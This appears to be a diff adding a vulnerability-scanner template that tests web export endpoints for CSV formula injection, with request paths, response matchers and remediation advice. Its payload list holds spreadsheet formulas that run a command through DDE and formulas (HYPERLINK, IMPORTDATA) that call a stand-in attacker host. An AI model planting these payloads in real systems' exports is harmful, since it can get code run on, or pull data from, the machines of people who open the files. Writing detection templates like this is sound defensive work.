@@ -1,0 +1,49 @@
+id: formula-injection-csv
+info:
+  name: CSV Formula Injection in Export Parameters
+  severity: medium
+  tags: [injection, csv, formula-injection, export, spreadsheet, dast]
+  description: "Injects spreadsheet formula payloads into parameters that drive CSV or spreadsheet exports. If the server returns a CSV file containing the raw formula without sanitisation, the formula will execute in any victim's spreadsheet application that opens the file."
+  remediation: "Prefix any exported cell value starting with =, +, -, or @ with a single quote before writing to CSV output. Reject or strip formula metacharacters in all export code paths."
+  cwe: "CWE-1236"
+  owasp: "A03:2021-Injection"
+
+payloads:
+  payload:
+    - "=cmd|' /C calc'!A0"
+    - "+cmd|' /C calc'!A0"
+    - "-2+3+cmd|' /C calc'!A0"
+    - "=HYPERLINK(\"http://evil.example.com\",\"click\")"
+    - "@SUM(1+1)*cmd|' /C calc'!A0"
+    - "=IMPORTDATA(\"http://evil.example.com/\")"
+
+requests:
+  - method: GET
+    paths:
+      - "/?export=csv&name={{payload}}"
+      - "/?format=csv&name={{payload}}"
+      - "/?download=csv&field={{payload}}"
+      - "/export?name={{payload}}&format=csv"
+      - "/api/export?name={{payload}}&format=csv"
+      - "/report?name={{payload}}&type=csv"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "text/csv"
+          - "application/csv"
+          - "attachment; filename"
+        part: header
+        condition: or
+      - type: regex
+        regex:
+          - "=cmd\\|"
+          - "=HYPERLINK"
+          - "=IMPORTDATA"
+          - "=WEBSERVICE"
+          - "\\+cmd\\|"
+          - "@SUM.*cmd"
+        part: body
+        condition: or
